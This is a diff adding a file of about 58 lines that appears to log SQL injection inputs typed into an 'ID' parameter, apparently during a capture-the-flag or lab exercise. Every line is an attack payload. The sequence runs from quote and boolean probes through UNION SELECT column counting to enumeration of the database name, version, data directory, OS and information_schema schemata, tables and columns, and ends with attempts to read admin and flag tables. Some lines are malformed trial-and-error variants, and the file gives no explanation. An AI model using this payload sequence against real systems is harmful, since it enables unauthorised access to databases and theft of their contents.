@@ -1,0 +1,58 @@
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:2
+ID:2
+ID:1
+ID:1'
+ID:1'
+ID:1'
+ID:1
+ID:1
+ID:1'
+ID:1'
+ID:1' and 'a'='a
+ID:1‘
+ID:1
+ID:1'
+ID:1' and 1=1 -- 
+ID:1' and 1=1 --  union select 1,2,3
+ID:1' and 1=1  union select 1,2,3-- 
+ID:1' and 1=1  union select 1,2,3 -- 
+ID:1' 20union select 1,2,3 -- 
+ID:1'union select 1,2,3 -- 
+ID:2'union select 1,2,3 -- 
+ID:2'union select 1,2,3 -- '
+ID:2'union select 1,2,3 -- 
+ID:2' union select 1,2,3 -- 
+ID:4' union select 1,2,3 -- 
+ID:4' union select 1,2 -- 
+ID:4' union select 1,2,3 -- 
+ID:4' union select 1,2,database() -- 
+ID:4' union select 1,2,database() -- 
+ID:4' union select 1,database(),3 -- 
+ID:4' union select 1,version(),3 -- 
+ID:4' union select 1,group_concat(schema_name) from information_schema.schemata,3 -- 
+ID:4' union select 1,database(),3 -- 
+ID:4' union select 1,7,3 -- 
+ID:' union select database() -- 
+ID:' union select 1,database(),3 -- 
+ID:' union select 1,@@datedir,3 -- 
+ID:' union select 1,@@datadir,3 -- 
+ID:' union select 1,@@version_compile_os,3 -- 
+ID:' union select 1,(group_concat(schema_name) from information_schema.schemata),3 -- 
+ID:' union select 1,(group_concat(table_name) from information_schema.tables),3 -- 
+ID:' union select 1,(group_concat(schema_name) from information_schema.schemata),3 -- 
+ID:' union select 1,select * from sqli,3 -- 
+ID:' union select 1,(select * from sqli),3 -- 
+ID:' union select 1,(select *),3 -- 
+ID:' union select 1,(group_concat(schema_name) from information_schema.schemata*),3 -- 
+ID:' union select 1,(select * from admin),3 -- 
+ID:' union select 1,(select flag from flag),3 -- 
+ID:' union select 1,group_concat(schema_name) from information_schema.schemata,3 -- 
+ID:' union select 1,(group_concat(schema_name) from information_schema.schemata),3 -- 
+ID:' union select 1,(group_concat(column_name) from information_schema.columns),3 -- 
+ID:' union select 1,(select flag from flag),3 -- 
